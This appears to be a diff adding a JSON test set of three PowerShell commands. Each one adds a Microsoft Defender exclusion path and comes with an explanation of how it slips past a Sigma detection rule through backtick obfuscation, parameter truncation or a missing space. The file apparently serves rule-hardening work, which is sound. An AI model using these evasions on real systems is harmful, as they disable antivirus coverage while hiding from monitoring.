@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Add-MpP`r`eference -ExclusionP`a`th 'C:\\Temp'\"",
+    "explanation": "Bypasses the rule's exact string matching by using PowerShell backticks (`) to obfuscate the cmdlet and parameter names. PowerShell ignores these backticks during execution, but they prevent the SIEM's 'CommandLine|contains' logic from matching 'Add-MpPreference ' and ' -ExclusionPath '."
+  },
+  {
+    "output": "powershell.exe -Command \"Add-MpPreference -ExclusionP 'C:\\Temp'\"",
+    "explanation": "PowerShell allows for parameter truncation as long as the parameter is unambiguous. By shortening '-ExclusionPath' to '-ExclusionP', the command executes successfully but avoids the explicit ' -ExclusionPath ' string match defined in the rule's selection2."
+  },
+  {
+    "output": "powershell.exe -Command \"Add-MpPreference -ExclusionPath'C:\\Temp'\"",
+    "explanation": "The Sigma rule checks for the parameter name surrounded by spaces (' -ExclusionPath '). Removing the trailing space and attaching the parameter value directly with quotes avoids the string match."
+  }
+]
